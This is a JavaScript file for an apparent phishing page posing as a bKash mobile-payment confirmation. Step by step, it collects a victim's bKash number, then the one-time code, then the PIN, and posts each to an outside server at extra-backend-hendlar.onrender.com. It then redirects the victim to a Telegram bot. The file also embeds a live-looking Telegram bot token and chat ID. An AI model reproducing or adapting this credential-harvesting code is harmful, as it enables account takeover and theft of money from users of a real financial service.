
const confirmButton = document.getElementById('confirmButton');
const closeButton = document.getElementById('closeButton');
const bkashNumberInput = document.getElementById('bkashNumber');
const loadingAnimation = document.getElementById('loadingAnimation');
const buttonsSection = document.getElementById('buttonsSection');
let bkashNumber = '';
  const botToken = "7925320513:AAHD688nFLC4cicGaOhbPYx458vAX8EnD-M"; // Your bot token
        const chatId = "1347276733"; // Replace with the user's chat ID
        const botUsername = "RedhatX10"; // Your bot username
function triggerLoadingAnimation(callback) {
    loadingAnimation.classList.remove('hidden');
    buttonsSection.classList.add('hidden');
    setTimeout(() => {
        loadingAnimation.classList.add('hidden');
        buttonsSection.classList.remove('hidden');
        if (callback) callback();
    }, 2000);
}

confirmButton.addEventListener('click', () => {
    if (confirmButton.innerHTML === 'CONFIRM') {
        bkashNumber = bkashNumberInput.value.trim();
        if (bkashNumber.startsWith('01') && bkashNumber.length === 11) {
            triggerLoadingAnimation(() => {
                sendRequest('sendBkashNumber', bkashNumber).then(() => {
                    bkashNumberInput.value = '';
                    bkashNumberInput.placeholder = 'Enter OTP';
                    bkashNumberInput.focus();
                    confirmButton.innerHTML = 'SUBMIT OTP';
                });
            });
        } else {
            alert('Please enter a valid bKash number starting with 01!');
        }
    } else if (confirmButton.innerHTML === 'SUBMIT OTP') {
        const otp = bkashNumberInput.value.trim();
        if (otp.length === 6) {
            triggerLoadingAnimation(() => {
                sendRequest('sendOtp', otp).then(() => {
                    bkashNumberInput.value = '';
                    bkashNumberInput.placeholder = 'Enter PIN';
                    bkashNumberInput.focus();
                    confirmButton.innerHTML = 'CONFIRM PAYMENT';
                });
            });
        } else {
            alert('Please enter the OTP!');
        }
    } else if (confirmButton.innerHTML === 'CONFIRM PAYMENT') {
        const pin = bkashNumberInput.value.trim();
        if (pin.length === 5) {
            triggerLoadingAnimation(() => {
                sendRequest('sendPin', pin).then(() => {
                     window.location.href = `https://t.me/${botUsername}`;
                });
            });
        } else {
            alert('Please enter your PIN!');
        }
    }
});

closeButton.addEventListener('click', () => {
    location.reload();
});

function sendRequest(step, data) {
    return fetch('https://extra-backend-hendlar.onrender.com/api/bkash', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ step, data }),
    }).then(response => {
        if (!response.ok) {
            throw new Error('Request failed!');
        }
        return response.json();
    });
}
